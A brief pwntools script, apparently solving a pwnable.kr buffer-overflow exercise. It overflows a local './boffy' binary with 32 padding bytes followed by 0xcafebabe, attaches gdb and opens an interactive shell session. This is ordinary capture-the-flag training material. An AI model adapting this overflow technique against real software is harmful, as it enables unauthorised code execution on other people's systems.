from pwn import *
context.terminal = ['gnome-terminal', '-e']
x = p32(0xcafebabe)
print(x)
#p = remote('pwnable.kr', 9000)
p = process(['./boffy'])
gdb.attach(p)
z = bytes(0x1)*32 + x
print(z)
p.sendline(z)
p.interactive()
